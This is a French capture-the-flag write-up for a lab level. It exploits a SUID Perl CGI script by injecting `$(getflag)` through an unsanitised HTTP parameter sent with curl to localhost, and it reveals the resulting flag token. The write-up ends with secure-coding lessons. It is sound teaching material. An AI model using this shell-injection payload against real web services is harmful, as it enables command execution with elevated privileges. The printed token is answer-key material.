# Niveau 04 - Exploitation par Injection de Commande Web

## Aperçu du défi
Le niveau 04 nous présente un script Perl (`level04.pl`) qui :

- Possède les permissions SUID (Set User ID) définies pour `flag04`.
- Fonctionne comme un simple script de serveur web.
- Est vulnérable à l'injection de commande.

## Analyse du fichier

### Permissions
```bash
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
```
### Observations clés :

- Le `s` dans les permissions indique que le bit SUID est activé.
- Le script s'exécute avec les privilèges de `flag04` lorsqu'il est exécuté.
- Il appartient à `flag04` mais est exécutable par les utilisateurs de `level04`.

## Analyse du contenu du script
```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  # Exécute la commande shell et affiche sa sortie (stdout et stderr)
  print `echo $y 2>&1`;
}
# Appelle la fonction x avec le paramètre 'x' de la requête HTTP
x(param("x"));
```
### Comprendre le script
Le script :

- Est une application web : Tourne sur `localhost:4747` (basé sur le commentaire).
- Utilise CGI : CGI (Common Gateway Interface) est un protocole permettant aux serveurs web d'exécuter des scripts.
- Prend une entrée utilisateur : Utilise `param("x")` pour obtenir un paramètre nommé "x" des requêtes HTTP.
- Exécute des commandes shell : Les accents graves (`) en Perl exécutent des commandes shell.
- N'a pas de validation d'entrée : Prend l'entrée utilisateur et la passe directement à une commande shell.

### Explication de la vulnérabilité
La vulnérabilité est une injection de commande classique :

- Le script prend un paramètre utilisateur ("x").
- Passe ce paramètre directement à une commande shell (`echo $y 2>&1`).
- Sans aucune désinfection ou validation.
- Et exécute cette commande avec les privilèges élevés de `flag04`.

## Étapes d'exploitation

### 1. Identifier le service web
Le commentaire `# localhost:4747` indique que le script fonctionne comme un serveur web sur le port 4747.

### 2. Fabriquer une charge utile d'injection de commande
Puisque le script exécute des commandes shell avec l'entrée utilisateur, nous pouvons utiliser la syntaxe shell pour injecter nos propres commandes :
```bash
$(getflag)
```

Cela fera exécuter au script :
```bash
echo $(getflag) 2>&1
```

La syntaxe `$()` indique au shell d'exécuter `getflag` et de substituer sa sortie.

### 3. Envoyer la requête d'exploitation
Utilisation de `curl` pour envoyer la requête HTTP avec notre charge utile :
```bash
curl "http://localhost:4747/level04.pl?x=\$(getflag)"
```
*(Note : Le `\` avant `$` est nécessaire pour empêcher le shell local d'interpréter `$(getflag)` avant que `curl` ne l'envoie)*

### 4. Résultat
```plaintext
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

## Pourquoi cela fonctionne

- Le script fonctionne comme un serveur web écoutant sur le port 4747.
- Il prend le paramètre "x" et le passe à une commande shell.
- Lorsque nous injectons `$(getflag)`, le shell exécute `getflag`.
- Parce que le script a les permissions SUID, `getflag` s'exécute avec les privilèges de `flag04`.
- La sortie de `getflag` est retournée dans la réponse HTTP.

## Leçons de sécurité

- **Validation des entrées** : Ne jamais faire confiance aux entrées utilisateur ; toujours les valider et les désinfecter.
- **Injection de commande** : Éviter de passer directement les entrées utilisateur aux commandes shell.
- **Scripts SUID** : Perl (et d'autres interpréteurs de script) ignorent souvent les bits SUID pour des raisons de sécurité, mais dans ce cas, l'injection de commande s'exécute toujours avec des privilèges élevés car c'est le shell invoqué qui exécute la commande injectée.
- **Sécurité Web** : Les applications web nécessitent une attention particulière à la sécurité car elles sont directement accessibles aux utilisateurs.

## Solution complète

```bash
# Se connecter au serveur web et injecter la commande getflag
curl "http://localhost:4747/level04.pl?x=\$(getflag)"

# Sortie attendue : Check flag.Here is your token: ne2searoevaevoem4ov4ar8ap
